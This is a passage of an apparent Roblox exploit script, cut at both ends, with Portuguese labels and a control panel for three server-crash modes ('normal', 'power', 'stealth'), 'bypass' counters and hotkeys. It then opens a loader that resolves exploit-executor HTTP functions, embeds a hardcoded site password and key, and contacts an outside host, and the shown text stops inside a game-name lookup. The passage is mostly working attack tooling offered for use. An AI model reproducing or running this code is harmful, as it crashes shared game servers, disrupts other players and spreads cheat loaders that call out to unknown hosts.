    textLbl.Size = UDim2.new(1, -20, 1, 0)
    textLbl.Position = UDim2.new(0, 14, 0, 0)
    textLbl.BackgroundTransparency = 1
    textLbl.Text = label
    textLbl.TextColor3 = color
    textLbl.Font = Enum.Font.GothamBold
    textLbl.TextSize = 12
    textLbl.TextXAlignment = Enum.TextXAlignment.Left
    textLbl.ZIndex = 5
    textLbl.Parent = card

    return textLbl, card, cs, badge
end

local StatusText, StatusCard, StatusStroke, StatusBadge = makeCard(78, "STATUT : INACTIF", COLORS.BloodBright)
local AntiCrashText, AntiCrashCard, AntiCrashStroke, AntiCrashBadge = makeCard(112, "ANTI-CRASH : ACTIF", COLORS.Green)

-- ============================================================
-- BARRA ANTI-FLOOD
-- ============================================================

local FloodLabel = Instance.new("TextLabel")
FloodLabel.Size = UDim2.new(1, -24, 0, 14)
FloodLabel.Position = UDim2.new(0, 12, 0, 146)
FloodLabel.BackgroundTransparency = 1
FloodLabel.Text = "FLOOD ANTI-CRASH: 0/30"
FloodLabel.TextColor3 = COLORS.PurpleGlow
FloodLabel.Font = Enum.Font.GothamBold
FloodLabel.TextSize = 10
FloodLabel.TextXAlignment = Enum.TextXAlignment.Left
FloodLabel.ZIndex = 5
FloodLabel.Parent = MainFrame

local FloodBarBg = Instance.new("Frame")
FloodBarBg.Size = UDim2.new(1, -24, 0, 6)
FloodBarBg.Position = UDim2.new(0, 12, 0, 162)
FloodBarBg.BackgroundColor3 = COLORS.BgOuter
FloodBarBg.BorderSizePixel = 0
FloodBarBg.ZIndex = 4
FloodBarBg.Parent = MainFrame

local FloodBarBgCorner = Instance.new("UICorner")
FloodBarBgCorner.CornerRadius = UDim.new(1, 0)
FloodBarBgCorner.Parent = FloodBarBg

local FloodBarFill = Instance.new("Frame")
FloodBarFill.Size = UDim2.new(0, 0, 1, 0)
FloodBarFill.BackgroundColor3 = COLORS.Green
FloodBarFill.BorderSizePixel = 0
FloodBarFill.ZIndex = 5
FloodBarFill.Parent = FloodBarBg

local FloodBarFillCorner = Instance.new("UICorner")
FloodBarFillCorner.CornerRadius = UDim.new(1, 0)
FloodBarFillCorner.Parent = FloodBarFill

local FloodBarGradient = Instance.new("UIGradient")
FloodBarGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, COLORS.Green),
    ColorSequenceKeypoint.new(0.5, COLORS.EmberHot),
    ColorSequenceKeypoint.new(1, COLORS.PowerRed),
}
FloodBarGradient.Parent = FloodBarFill

-- ============================================================
-- LOG VISUAL
-- ============================================================

local LogLabel = Instance.new("TextLabel")
LogLabel.Size = UDim2.new(1, -24, 0, 16)
LogLabel.Position = UDim2.new(0, 12, 0, 174)
LogLabel.BackgroundTransparency = 1
LogLabel.Text = "METODO: ---"
LogLabel.TextColor3 = COLORS.EmberHot
LogLabel.Font = Enum.Font.GothamBold
LogLabel.TextSize = 10
LogLabel.TextXAlignment = Enum.TextXAlignment.Left
LogLabel.ZIndex = 5
LogLabel.Parent = MainFrame

-- ============================================================
-- BOTAO 1: CRASH NORMAL
-- ============================================================

local ToggleBtn = Instance.new("TextButton")
ToggleBtn.Size = UDim2.new(1, -24, 0, 40)
ToggleBtn.Position = UDim2.new(0, 12, 0, 196)
ToggleBtn.BackgroundColor3 = COLORS.EmberDeep
ToggleBtn.Text = ""
ToggleBtn.AutoButtonColor = false
ToggleBtn.BorderSizePixel = 0
ToggleBtn.ZIndex = 4
ToggleBtn.Parent = MainFrame

local ToggleCorner = Instance.new("UICorner")
ToggleCorner.CornerRadius = UDim.new(0, 10)
ToggleCorner.Parent = ToggleBtn

local ToggleGradient = Instance.new("UIGradient")
ToggleGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, COLORS.EmberHot),
    ColorSequenceKeypoint.new(0.5, COLORS.Ember),
    ColorSequenceKeypoint.new(1, COLORS.EmberDeep),
}
ToggleGradient.Rotation = 90
ToggleGradient.Parent = ToggleBtn

local ToggleStroke = Instance.new("UIStroke")
ToggleStroke.Color = COLORS.EmberHot
ToggleStroke.Thickness = 2
ToggleStroke.Transparency = 0.1
ToggleStroke.Parent = ToggleBtn

local ToggleGlow = Instance.new("Frame")
ToggleGlow.Size = UDim2.new(1, 6, 1, 6)
ToggleGlow.Position = UDim2.new(0, -3, 0, -3)
ToggleGlow.BackgroundColor3 = COLORS.Ember
ToggleGlow.BackgroundTransparency = 0.85
ToggleGlow.BorderSizePixel = 0
ToggleGlow.ZIndex = 3
ToggleGlow.Parent = ToggleBtn

local ToggleGlowCorner = Instance.new("UICorner")
ToggleGlowCorner.CornerRadius = UDim.new(0, 12)
ToggleGlowCorner.Parent = ToggleGlow

task.spawn(function()
    while ToggleGlow.Parent do
        TweenService:Create(ToggleGlow, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            BackgroundTransparency = 0.7,
            Size = UDim2.new(1, 14, 1, 14),
            Position = UDim2.new(0, -7, 0, -7),
        }):Play()
        task.wait(1.2)
        TweenService:Create(ToggleGlow, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            BackgroundTransparency = 0.9,
            Size = UDim2.new(1, 6, 1, 6),
            Position = UDim2.new(0, -3, 0, -3),
        }):Play()
        task.wait(1.2)
    end
end)

local ToggleText = Instance.new("TextLabel")
ToggleText.Size = UDim2.new(1, 0, 1, 0)
ToggleText.BackgroundTransparency = 1
ToggleText.Text = "ATIVAR CRASH"
ToggleText.TextColor3 = COLORS.Bone
ToggleText.Font = Enum.Font.GothamBlack
ToggleText.TextSize = 13
ToggleText.TextStrokeTransparency = 0.6
ToggleText.TextStrokeColor3 = COLORS.EmberDeep
ToggleText.ZIndex = 5
ToggleText.Parent = ToggleBtn

-- ============================================================
-- BOTAO 2: CRASH POWER
-- ============================================================

local PowerBtn = Instance.new("TextButton")
PowerBtn.Size = UDim2.new(1, -24, 0, 40)
PowerBtn.Position = UDim2.new(0, 12, 0, 244)
PowerBtn.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
PowerBtn.Text = ""
PowerBtn.AutoButtonColor = false
PowerBtn.BorderSizePixel = 0
PowerBtn.ZIndex = 4
PowerBtn.Parent = MainFrame

local PowerBtnCorner = Instance.new("UICorner")
PowerBtnCorner.CornerRadius = UDim.new(0, 10)
PowerBtnCorner.Parent = PowerBtn

local PowerBtnGradient = Instance.new("UIGradient")
PowerBtnGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, COLORS.PowerRed),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(180, 0, 0)),
    ColorSequenceKeypoint.new(1, COLORS.PowerDark),
}
PowerBtnGradient.Rotation = 90
PowerBtnGradient.Parent = PowerBtn

local PowerBtnStroke = Instance.new("UIStroke")
PowerBtnStroke.Color = COLORS.PowerRedHot
PowerBtnStroke.Thickness = 1.5
PowerBtnStroke.Transparency = 0.3
PowerBtnStroke.Parent = PowerBtn

local PowerGlow = Instance.new("Frame")
PowerGlow.Size = UDim2.new(1, 6, 1, 6)
PowerGlow.Position = UDim2.new(0, -3, 0, -3)
PowerGlow.BackgroundColor3 = COLORS.PowerRed
PowerGlow.BackgroundTransparency = 0.85
PowerGlow.BorderSizePixel = 0
PowerGlow.ZIndex = 3
PowerGlow.Parent = PowerBtn

local PowerGlowCorner = Instance.new("UICorner")
PowerGlowCorner.CornerRadius = UDim.new(0, 12)
PowerGlowCorner.Parent = PowerGlow

task.spawn(function()
    while PowerGlow.Parent do
        TweenService:Create(PowerGlow, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            BackgroundTransparency = 0.55,
            Size = UDim2.new(1, 16, 1, 16),
            Position = UDim2.new(0, -8, 0, -8),
        }):Play()
        task.wait(0.8)
        TweenService:Create(PowerGlow, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            BackgroundTransparency = 0.9,
            Size = UDim2.new(1, 6, 1, 6),
            Position = UDim2.new(0, -3, 0, -3),
        }):Play()
        task.wait(0.8)
    end
end)

local PowerBtnText = Instance.new("TextLabel")
PowerBtnText.Size = UDim2.new(1, 0, 1, 0)
PowerBtnText.BackgroundTransparency = 1
PowerBtnText.Text = "ATIVAR CRASH POWER"
PowerBtnText.TextColor3 = COLORS.Bone
PowerBtnText.Font = Enum.Font.GothamBlack
PowerBtnText.TextSize = 13
PowerBtnText.TextStrokeTransparency = 0.6
PowerBtnText.TextStrokeColor3 = COLORS.PowerDark
PowerBtnText.ZIndex = 5
PowerBtnText.Parent = PowerBtn

-- ============================================================
-- BOTAO 3: CRASH STEALTH
-- ============================================================

local StealthBtn = Instance.new("TextButton")
StealthBtn.Size = UDim2.new(1, -24, 0, 40)
StealthBtn.Position = UDim2.new(0, 12, 0, 292)
StealthBtn.BackgroundColor3 = COLORS.StealthDark
StealthBtn.Text = ""
StealthBtn.AutoButtonColor = false
StealthBtn.BorderSizePixel = 0
StealthBtn.ZIndex = 4
StealthBtn.Parent = MainFrame

local StealthBtnCorner = Instance.new("UICorner")
StealthBtnCorner.CornerRadius = UDim.new(0, 10)
StealthBtnCorner.Parent = StealthBtn

local StealthBtnGradient = Instance.new("UIGradient")
StealthBtnGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, COLORS.StealthBlue),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(30, 100, 180)),
    ColorSequenceKeypoint.new(1, COLORS.StealthDark),
}
StealthBtnGradient.Rotation = 90
StealthBtnGradient.Parent = StealthBtn

local StealthBtnStroke = Instance.new("UIStroke")
StealthBtnStroke.Color = COLORS.StealthGlow
StealthBtnStroke.Thickness = 1.5
StealthBtnStroke.Transparency = 0.3
StealthBtnStroke.Parent = StealthBtn

local StealthGlow = Instance.new("Frame")
StealthGlow.Size = UDim2.new(1, 6, 1, 6)
StealthGlow.Position = UDim2.new(0, -3, 0, -3)
StealthGlow.BackgroundColor3 = COLORS.StealthBlue
StealthGlow.BackgroundTransparency = 0.85
StealthGlow.BorderSizePixel = 0
StealthGlow.ZIndex = 3
StealthGlow.Parent = StealthBtn

local StealthGlowCorner = Instance.new("UICorner")
StealthGlowCorner.CornerRadius = UDim.new(0, 12)
StealthGlowCorner.Parent = StealthGlow

task.spawn(function()
    while StealthGlow.Parent do
        TweenService:Create(StealthGlow, TweenInfo.new(2.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            BackgroundTransparency = 0.7,
            Size = UDim2.new(1, 12, 1, 12),
            Position = UDim2.new(0, -6, 0, -6),
        }):Play()
        task.wait(2.5)
        TweenService:Create(StealthGlow, TweenInfo.new(2.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            BackgroundTransparency = 0.92,
            Size = UDim2.new(1, 6, 1, 6),
            Position = UDim2.new(0, -3, 0, -3),
        }):Play()
        task.wait(2.5)
    end
end)

local StealthBtnText = Instance.new("TextLabel")
StealthBtnText.Size = UDim2.new(1, 0, 1, 0)
StealthBtnText.BackgroundTransparency = 1
StealthBtnText.Text = "ATIVAR CRASH STEALTH"
StealthBtnText.TextColor3 = COLORS.Bone
StealthBtnText.Font = Enum.Font.GothamBlack
StealthBtnText.TextSize = 13
StealthBtnText.TextStrokeTransparency = 0.6
StealthBtnText.TextStrokeColor3 = COLORS.StealthDark
StealthBtnText.ZIndex = 5
StealthBtnText.Parent = StealthBtn

-- ============================================================
-- BOTAO ANTI-CRASH
-- ============================================================

local AntiCrashBtn = Instance.new("TextButton")
AntiCrashBtn.Size = UDim2.new(1, -24, 0, 34)
AntiCrashBtn.Position = UDim2.new(0, 12, 0, 342)
AntiCrashBtn.BackgroundColor3 = COLORS.PurpleDeep
AntiCrashBtn.Text = ""
AntiCrashBtn.AutoButtonColor = false
AntiCrashBtn.BorderSizePixel = 0
AntiCrashBtn.ZIndex = 4
AntiCrashBtn.Parent = MainFrame

local AntiCrashBtnCorner = Instance.new("UICorner")
AntiCrashBtnCorner.CornerRadius = UDim.new(0, 10)
AntiCrashBtnCorner.Parent = AntiCrashBtn

local AntiCrashBtnGradient = Instance.new("UIGradient")
AntiCrashBtnGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, COLORS.Purple),
    ColorSequenceKeypoint.new(0.5, COLORS.PurpleDeep),
    ColorSequenceKeypoint.new(1, COLORS.Magenta),
}
AntiCrashBtnGradient.Rotation = 90
AntiCrashBtnGradient.Parent = AntiCrashBtn

local AntiCrashBtnStroke = Instance.new("UIStroke")
AntiCrashBtnStroke.Color = COLORS.PurpleGlow
AntiCrashBtnStroke.Thickness = 1.5
AntiCrashBtnStroke.Transparency = 0.3
AntiCrashBtnStroke.Parent = AntiCrashBtn

local AntiCrashBtnText = Instance.new("TextLabel")
AntiCrashBtnText.Size = UDim2.new(1, 0, 1, 0)
AntiCrashBtnText.BackgroundTransparency = 1
AntiCrashBtnText.Text = "DESATIVAR ANTI-CRASH"
AntiCrashBtnText.TextColor3 = COLORS.Bone
AntiCrashBtnText.Font = Enum.Font.GothamBold
AntiCrashBtnText.TextSize = 11
AntiCrashBtnText.TextStrokeTransparency = 0.7
AntiCrashBtnText.ZIndex = 5
AntiCrashBtnText.Parent = AntiCrashBtn

-- ============================================================
-- RODAPE
-- ============================================================

local FooterFrame = Instance.new("Frame")
FooterFrame.Size = UDim2.new(1, -24, 0, 40)
FooterFrame.Position = UDim2.new(0, 12, 1, -50)
FooterFrame.BackgroundColor3 = COLORS.BgOuter
FooterFrame.BackgroundTransparency = 0.35
FooterFrame.BorderSizePixel = 0
FooterFrame.ZIndex = 4
FooterFrame.Parent = MainFrame

local FooterCorner = Instance.new("UICorner")
FooterCorner.CornerRadius = UDim.new(0, 8)
FooterCorner.Parent = FooterFrame

local CounterLabel = Instance.new("TextLabel")
CounterLabel.Size = UDim2.new(1, -20, 0, 16)
CounterLabel.Position = UDim2.new(0, 10, 0, 4)
CounterLabel.BackgroundTransparency = 1
CounterLabel.Text = "BLOQUEIOS: 0  |  BYPASS: 0"
CounterLabel.TextColor3 = COLORS.EmberHot
CounterLabel.Font = Enum.Font.GothamBold
CounterLabel.TextSize = 10
CounterLabel.TextXAlignment = Enum.TextXAlignment.Left
CounterLabel.ZIndex = 5
CounterLabel.Parent = FooterFrame

local KeybindLabel = Instance.new("TextLabel")
KeybindLabel.Size = UDim2.new(1, -20, 0, 16)
KeybindLabel.Position = UDim2.new(0, 10, 0, 20)
KeybindLabel.BackgroundTransparency = 1
KeybindLabel.Text = "[R] Normal  |  [T] Power  |  [Y] Stealth"
KeybindLabel.TextColor3 = COLORS.PurpleGlow
KeybindLabel.Font = Enum.Font.GothamBold
KeybindLabel.TextSize = 10
KeybindLabel.TextXAlignment = Enum.TextXAlignment.Left
KeybindLabel.ZIndex = 5
KeybindLabel.Parent = FooterFrame

-- ============================================================
-- PARTICULAS (brasas + faiscas roxas)
-- ============================================================

local emberContainer = Instance.new("Frame")
emberContainer.Size = UDim2.new(1, 0, 1, 0)
emberContainer.BackgroundTransparency = 1
emberContainer.ClipsDescendants = true
emberContainer.ZIndex = 1
emberContainer.Parent = MainFrame

task.spawn(function()
    while ScreenGui.Parent do
        local ember = Instance.new("Frame")
        ember.Size = UDim2.new(0, 3, 0, 3)
        ember.Position = UDim2.new(math.random(), 0, 1, -5)
        ember.BackgroundColor3 = math.random() > 0.5 and COLORS.Ember or COLORS.EmberHot
        ember.BackgroundTransparency = 0.15
        ember.BorderSizePixel = 0
        ember.ZIndex = 1
        ember.Parent = emberContainer

        local ec = Instance.new("UICorner")
        ec.CornerRadius = UDim.new(1, 0)
        ec.Parent = ember

        TweenService:Create(ember, TweenInfo.new(3, Enum.EasingStyle.Linear), {
            Position = UDim2.new(ember.Position.X.Scale + math.random(-15, 15) / 100, 0, 0, -10),
            BackgroundTransparency = 1,
            Size = UDim2.new(0, 1, 0, 1),
        }):Play()

        task.delay(3, function() if ember then ember:Destroy() end end)
        task.wait(math.random(7, 16) / 100)
    end
end)

task.spawn(function()
    while ScreenGui.Parent do
        local spark = Instance.new("Frame")
        spark.Size = UDim2.new(0, 2, 0, 2)
        spark.Position = UDim2.new(math.random(), 0, math.random(), 0)
        spark.BackgroundColor3 = COLORS.PurpleGlow
        spark.BackgroundTransparency = 0.3
        spark.BorderSizePixel = 0
        spark.ZIndex = 1
        spark.Parent = emberContainer

        local sc = Instance.new("UICorner")
        sc.CornerRadius = UDim.new(1, 0)
        sc.Parent = spark

        TweenService:Create(spark, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
            BackgroundTransparency = 1,
            Size = UDim2.new(0, 6, 0, 6),
        }):Play()

        task.delay(1.5, function() if spark then spark:Destroy() end end)
        task.wait(math.random(15, 30) / 100)
    end
end)

-- ============================================================
-- PULSACAO
-- ============================================================

local pulseTween
local function startPulse()
    if pulseTween then pulseTween:Cancel() end
    pulseTween = TweenService:Create(
        MainStroke,
        TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {Color = COLORS.PurpleGlow, Transparency = 0.4, Thickness = 3}
    )
    pulseTween:Play()
end

local function stopPulse()
    if pulseTween then pulseTween:Cancel() end
    MainStroke.Color = COLORS.Ember
    MainStroke.Transparency = 0.1
    MainStroke.Thickness = 2
end

-- ============================================================
-- UPDATE UI
-- ============================================================

local function updateUI()
    -- Card de status
    if State.Active then
        StatusText.Text = "STATUT : CRASH NORMAL"
        StatusText.TextColor3 = COLORS.Green
        StatusStroke.Color = COLORS.Green
        StatusBadge.BackgroundColor3 = COLORS.Green
        ToggleText.Text = "DESATIVAR CRASH"
        ToggleGradient.Color = ColorSequence.new{
            ColorSequenceKeypoint.new(0, COLORS.GreenGlow),
            ColorSequenceKeypoint.new(0.5, COLORS.Green),
            ColorSequenceKeypoint.new(1, COLORS.GreenDeep),
        }
        ToggleStroke.Color = COLORS.GreenGlow
        ToggleGlow.BackgroundColor3 = COLORS.Green
        startPulse()
    elseif PowerState.Active then
        StatusText.Text = "STATUT : CRASH POWER"
        StatusText.TextColor3 = COLORS.PowerRedHot
        StatusStroke.Color = COLORS.PowerRed
        StatusBadge.BackgroundColor3 = COLORS.PowerRed
        ToggleText.Text = "ATIVAR CRASH"
        ToggleGradient.Color = ColorSequence.new{
            ColorSequenceKeypoint.new(0, COLORS.EmberHot),
            ColorSequenceKeypoint.new(0.5, COLORS.Ember),
            ColorSequenceKeypoint.new(1, COLORS.EmberDeep),
        }
        ToggleStroke.Color = COLORS.EmberHot
        ToggleGlow.BackgroundColor3 = COLORS.Ember
        startPulse()
    elseif StealthState.Active then
        StatusText.Text = "STATUT : CRASH STEALTH"
        StatusText.TextColor3 = COLORS.StealthGlow
        StatusStroke.Color = COLORS.StealthBlue
        StatusBadge.BackgroundColor3 = COLORS.StealthBlue
        ToggleText.Text = "ATIVAR CRASH"
        ToggleGradient.Color = ColorSequence.new{
            ColorSequenceKeypoint.new(0, COLORS.EmberHot),
            ColorSequenceKeypoint.new(0.5, COLORS.Ember),
            ColorSequenceKeypoint.new(1, COLORS.EmberDeep),
        }
        ToggleStroke.Color = COLORS.EmberHot
        ToggleGlow.BackgroundColor3 = COLORS.Ember
        startPulse()
    else
        StatusText.Text = "STATUT : INACTIF"
        StatusText.TextColor3 = COLORS.BloodBright
        StatusStroke.Color = COLORS.Blood
        StatusBadge.BackgroundColor3 = COLORS.BloodBright
        ToggleText.Text = "ATIVAR CRASH"
        ToggleGradient.Color = ColorSequence.new{
            ColorSequenceKeypoint.new(0, COLORS.EmberHot),
            ColorSequenceKeypoint.new(0.5, COLORS.Ember),
            ColorSequenceKeypoint.new(1, COLORS.EmberDeep),
        }
        ToggleStroke.Color = COLORS.EmberHot
        ToggleGlow.BackgroundColor3 = COLORS.Ember
        stopPulse()
    end

    -- Anti-crash card
    if AntiCrash.Enabled then
        AntiCrashText.Text = "ANTI-CRASH : ACTIF"
        AntiCrashText.TextColor3 = COLORS.Green
        AntiCrashStroke.Color = COLORS.Green
        AntiCrashBadge.BackgroundColor3 = COLORS.Green
        AntiCrashBtnText.Text = "DESATIVAR ANTI-CRASH"
        AntiCrashBtnGradient.Color = ColorSequence.new{
            ColorSequenceKeypoint.new(0, COLORS.Purple),
            ColorSequenceKeypoint.new(0.5, COLORS.PurpleDeep),
            ColorSequenceKeypoint.new(1, COLORS.Magenta),
        }
    else
        AntiCrashText.Text = "ANTI-CRASH : INACTIF"
        AntiCrashText.TextColor3 = COLORS.BloodBright
        AntiCrashStroke.Color = COLORS.Blood
        AntiCrashBadge.BackgroundColor3 = COLORS.BloodBright
        AntiCrashBtnText.Text = "ATIVAR ANTI-CRASH"
        AntiCrashBtnGradient.Color = ColorSequence.new{
            ColorSequenceKeypoint.new(0, Color3.fromRGB(90, 20, 25)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 10, 10)),
        }
    end

    -- Power btn label
    if PowerState.Active then
        PowerBtnText.Text = "DESATIVAR CRASH POWER"
    else
        PowerBtnText.Text = "ATIVAR CRASH POWER"
    end

    -- Stealth btn label
    if StealthState.Active then
        StealthBtnText.Text = "DESATIVAR CRASH STEALTH"
    else
        StealthBtnText.Text = "ATIVAR CRASH STEALTH"
    end

    -- Barra anti-flood
    local floodCount = getFloodCount()
    local pct = math.clamp(floodCount / SIGNAL_FLOOD_THRESHOLD, 0, 1)
    TweenService:Create(FloodBarFill, TweenInfo.new(0.2), {Size = UDim2.new(pct, 0, 1, 0)}):Play()
    FloodLabel.Text = "FLOOD ANTI-CRASH: " .. floodCount .. "/" .. SIGNAL_FLOOD_THRESHOLD

    local barColor
    if pct < 0.5 then
        barColor = COLORS.Green
    elseif pct < 0.8 then
        barColor = COLORS.EmberHot
    else
        barColor = COLORS.PowerRed
    end
    FloodBarFill.BackgroundColor3 = barColor

    -- Log visual de metodo
    if PowerState.Active then
        LogLabel.Text = "METODO: " .. PowerState.CurrentMethod .. "  |  DELAY: " .. string.format("%.3f", PowerState.AdaptiveDelay) .. "s"
        LogLabel.TextColor3 = COLORS.PowerRedHot
    elseif State.Active then
        LogLabel.Text = "METODO: ReplicateSignal (normal)"
        LogLabel.TextColor3 = COLORS.EmberHot
    elseif StealthState.Active then
        LogLabel.Text = "METODO: Stealth (delay ~" .. string.format("%.2f", StealthState.BaseDelay) .. "s)"
        LogLabel.TextColor3 = COLORS.StealthGlow
    else
        LogLabel.Text = "METODO: ---"
        LogLabel.TextColor3 = COLORS.BoneDim
    end

    -- Contador
    local total = AntiCrash.BlockedSignals + AntiCrash.BlockedHiddenProps + AntiCrash.BlockedParentHijack
    local bypass = PowerState.SuccessfulBypasses + StealthState.SuccessfulBypasses
    CounterLabel.Text = "BLOQUEIOS: " .. total .. "  |  BYPASS: " .. bypass
end

-- ============================================================
-- INTERACOES
-- ============================================================

ToggleBtn.MouseEnter:Connect(function()
    TweenService:Create(ToggleStroke, TweenInfo.new(0.15), {Transparency = 0, Thickness = 3}):Play()
    TweenService:Create(ToggleText, TweenInfo.new(0.15), {TextSize = 14}):Play()
end)
ToggleBtn.MouseLeave:Connect(function()
    TweenService:Create(ToggleStroke, TweenInfo.new(0.15), {Transparency = 0.1, Thickness = 2}):Play()
    TweenService:Create(ToggleText, TweenInfo.new(0.15), {TextSize = 13}):Play()
end)

PowerBtn.MouseEnter:Connect(function()
    TweenService:Create(PowerBtnStroke, TweenInfo.new(0.15), {Transparency = 0, Thickness = 3}):Play()
    TweenService:Create(PowerBtnText, TweenInfo.new(0.15), {TextSize = 14}):Play()
end)
PowerBtn.MouseLeave:Connect(function()
    TweenService:Create(PowerBtnStroke, TweenInfo.new(0.15), {Transparency = 0.3, Thickness = 1.5}):Play()
    TweenService:Create(PowerBtnText, TweenInfo.new(0.15), {TextSize = 13}):Play()
end)

StealthBtn.MouseEnter:Connect(function()
    TweenService:Create(StealthBtnStroke, TweenInfo.new(0.15), {Transparency = 0, Thickness = 3}):Play()
    TweenService:Create(StealthBtnText, TweenInfo.new(0.15), {TextSize = 14}):Play()
end)
StealthBtn.MouseLeave:Connect(function()
    TweenService:Create(StealthBtnStroke, TweenInfo.new(0.15), {Transparency = 0.3, Thickness = 1.5}):Play()
    TweenService:Create(StealthBtnText, TweenInfo.new(0.15), {TextSize = 13}):Play()
end)

AntiCrashBtn.MouseEnter:Connect(function()
    TweenService:Create(AntiCrashBtnStroke, TweenInfo.new(0.15), {Transparency = 0}):Play()
end)
AntiCrashBtn.MouseLeave:Connect(function()
    TweenService:Create(AntiCrashBtnStroke, TweenInfo.new(0.15), {Transparency = 0.3}):Play()
end)

ToggleBtn.MouseButton1Click:Connect(function()
    if State.Active then deactivateReset() else activateReset() end
    updateUI()
end)

PowerBtn.MouseButton1Click:Connect(function()
    if PowerState.Active then deactivatePowerCrash() else activatePowerCrash() end
    updateUI()
end)

StealthBtn.MouseButton1Click:Connect(function()
    if StealthState.Active then deactivateStealthCrash() else activateStealthCrash() end
    updateUI()
end)

AntiCrashBtn.MouseButton1Click:Connect(function()
    AntiCrash.Enabled = not AntiCrash.Enabled
    updateUI()
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == State.Keybind then
        if State.Active then deactivateReset() else activateReset() end
        updateUI()
    elseif input.KeyCode == Enum.KeyCode.T then
        if PowerState.Active then deactivatePowerCrash() else activatePowerCrash() end
        updateUI()
    elseif input.KeyCode == Enum.KeyCode.Y then
        if StealthState.Active then deactivateStealthCrash() else activateStealthCrash() end
        updateUI()
    end
end)

task.spawn(function()
    while ScreenGui.Parent do
        task.wait(0.25)
        updateUI()
    end
end)

-- ============================================================
-- CHARACTER ADDED
-- ============================================================

LocalPlayer.CharacterAdded:Connect(function(newChar)
    protectCharacter(newChar)
    if State.Active then
        task.wait(0.5)
        State.Character = newChar
        State.Humanoid = newChar:FindFirstChildWhichIsA("Humanoid")
        State.Valid = newChar:QueryDescendants("BasePart") or {}
        State.OriginalParent = newChar.Parent
        if State.Humanoid then
            immediateReset(State.Humanoid)
            State.PhysicsLoop = startPhysicsLoop(newChar, State.Humanoid, State.Valid)
            State.LoopThread = mainResetLoop(newChar, State.Humanoid)
        end
    end
    if PowerState.Active then
        task.wait(0.5)
        PowerState.Character = newChar
        PowerState.Humanoid = newChar:FindFirstChildWhichIsA("Humanoid")
        PowerState.Valid = newChar:QueryDescendants("BasePart") or {}
        PowerState.OriginalParent = newChar.Parent
        if PowerState.Humanoid then
            PowerState.PhysicsLoop = startPowerPhysicsLoop(newChar, PowerState.Humanoid, PowerState.Valid)
            PowerState.LoopThread = mainPowerLoop(newChar, PowerState.Humanoid, PowerState.Valid)
        end
    end
    if StealthState.Active then
        task.wait(0.5)
        StealthState.Character = newChar
        StealthState.Humanoid = newChar:FindFirstChildWhichIsA("Humanoid")
        StealthState.Valid = newChar:QueryDescendants("BasePart") or {}
        StealthState.OriginalParent = newChar.Parent
        if StealthState.Humanoid then
            StealthState.PhysicsLoop = startStealthPhysicsLoop(newChar, StealthState.Humanoid, StealthState.Valid)
            StealthState.LoopThread = mainStealthLoop(newChar, StealthState.Humanoid, StealthState.Valid)
        end
    end
    updateUI()
end)

if LocalPlayer.Character then
    protectCharacter(LocalPlayer.Character)
end

updateUI()
startPulse()
print("[EMBER ULTRA POWER] Sistema inicializado. 3 modos + Anti-AntiCrash")





local BASE = "https://generator-crash.lovable.app"
local SITE_SLUG = "crashhaha"
local SITE_PASSWORD = "elias123@"
local KEY = "xenooooo"
local LOADER_VERSION = "1.9.0"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")
local RobloxReplicated = game:GetService("RobloxReplicatedStorage")

local genv = (getgenv and getgenv()) or _G or {}

if type(genv.__XENO_CLEANUP) == "function" then pcall(genv.__XENO_CLEANUP) end

genv.__XENO_SESSION = (tonumber(genv.__XENO_SESSION) or 0) + 1
local SESSION = genv.__XENO_SESSION
local function alive() return genv.__XENO_SESSION == SESSION end


local function resolveRequest()
    return http_request
        or request
        or (syn and syn.request)
        or (http and http.request)
        or (fluxus and fluxus.request)
        or (krnl and krnl.request)
        or genv.http_request
        or genv.request
        or (genv.syn and genv.syn.request)
        or (genv.http and genv.http.request)
end

local request = resolveRequest()
if not request then
    local deadline = tick() + 10
    repeat task.wait(0.25) request = resolveRequest() until request or tick() > deadline
end

local function fallbackRequest(opts)
    local method = (opts.Method or "GET"):upper()
    if method == "POST" then
        local ok, res = pcall(function()
            return game:HttpPostAsync(opts.Url, opts.Body or "", "application/json")
        end)
        if ok then return { Body = res, StatusCode = 200, Success = true } end
        return nil
    end
    local ok, res = pcall(function() return game:HttpGetAsync(opts.Url) end)
    if ok then return { Body = res, StatusCode = 200, Success = true } end
    ok, res = pcall(function() return game:HttpGet(opts.Url) end)
    if ok then return { Body = res, StatusCode = 200, Success = true } end
    return nil
end

local function httpOnce(opts)
    if not request then request = resolveRequest() end
    if request then
        local ok, res = pcall(request, opts)
        if ok and res and (res.StatusCode == nil or (res.StatusCode >= 200 and res.StatusCode < 300)) then
            return res
        end
    end
    return fallbackRequest(opts)
end

local function httpRequest(opts)
    for attempt = 1, 3 do
        local res = httpOnce(opts)
        if res then return res end
        task.wait(0.2 * attempt)
    end
    return nil
end


local LP = Players.LocalPlayer
if not LP then
    local deadline = tick() + 30
    repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
end
if not LP then return end

local function safe(fn) local ok, res = pcall(fn) if ok then return res end return nil end

local executorName = "unknown"
do
    local ok, name = pcall(function()
        if identifyexecutor then return (identifyexecutor()) end
        return nil
    end)
    if ok and type(name) == "string" and name ~= "" then executorName = name end
end

local cachedGameName = nil
local function gameName()
    if cachedGameName then return cachedGameName end
